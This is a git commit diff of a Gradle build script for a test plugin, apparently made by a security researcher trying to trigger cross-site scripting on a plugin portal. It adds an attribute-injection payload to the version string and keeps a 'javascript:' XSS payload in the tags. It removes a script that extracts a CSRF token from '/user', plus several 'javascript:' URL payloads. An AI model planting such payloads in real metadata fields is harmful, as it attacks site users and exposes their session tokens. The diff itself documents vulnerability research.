83058bd5e8303bcf0cdc69eb2cb6d9727558d7dc
Jonathan Leitschuh <Jonathan.Leitschuh@plexxi.com>
2019-01-25 13:54:23 -0500

    Contrinued attempts to get XXS

--- build.gradle.kts
+++ build.gradle.kts
@@ -1,6 +1,3 @@
-import com.gradle.publish.PublishPlugin
-import com.gradle.publish.PublishTask
-
 plugins {
     java
     id("org.jlleitschuh.plugin-publish")
@@ -9,10 +6,10 @@ plugins {
 
 
 group = "org.jlleitschuh.testing.security"
-val versionBase = "0.4.42"
+val versionBase = "0.4.44"
 val versionExtension = ""
-val xxsExploitVersion = "\"onmouseover=alert(32)"
-val customVersion = "$versionBase-$versionExtension-SNAPSHOT-a"
+val xxsExploitVersion = "\\\"onmouseover=alert(32)"
+val customVersion = "$versionBase-$versionExtension-SNAPSHOT-a$xxsExploitVersion"
 version = customVersion
 
 repositories {
@@ -52,29 +49,13 @@ Can links be rendered?
 tasks.withType<Javadoc>().configureEach {
     isFailOnError = false
 }
-
-val CSRF_TOKEN_EXTRACTION_JAVASCRIPT = """
-var x = new XMLHttpRequest();
-x.open( "GET", "/user", false );
-x.send( null );
-var l = x.responseText.split(/\r?\n/).filter(function(x) { return x.includes("csrfToken")});
-alert("CSRF Token:" + l[0].substring(l[0].lastIndexOf("value=\"") + 7, l[0].lastIndexOf("\"")));
-""".trimIndent().replace("\n", "").replace("  ", "")
-println(CSRF_TOKEN_EXTRACTION_JAVASCRIPT)
-val CSRF_MINIFIED =
-    "var x=new XMLHttpRequest;x.open(\"GET\",\"/user\",!1),x.send(null);var l=x.responseText.split(/\\r?\\n/).filter(function(e){return e.includes(\"csrfToken\")});alert(\"CSRF Token:\"+l[0].substring(l[0].lastIndexOf('value=\"')+7,l[0].lastIndexOf('\"')));"
-val javascript_CSRF = "javascript:$CSRF_MINIFIED"
-
-val simplifiedXss = "javascript:function httpGet(e){var n=new XMLHttpRequest;return n.open(\"GET\",e,!1),n.send(null),n.responseText}alert(\"Cross site scripting in vcs.\")"
-val vcsUrlTest = "javascript:alert( \"Cross site scripting in vcs.\")"
-val websiteUrlTest = "javascript:alert( \"Cross site scripting in website url.\")"
 val xssTag = "javascript:alert(\"Cross site scripting in tag.\")"
 
 pluginBundle {
     description = "Some description"
 
-    vcsUrl = javascript_CSRF
-    website = javascript_CSRF
+    vcsUrl = "https://github.com/jlleitschuh/gradle-testing"
+    website = "https://github.com/jlleitschuh/gradle-testing"
     tags = listOf("dont-use", "really-dont-use", "gradle", "plugin", xssTag)
 
     (plugins) {
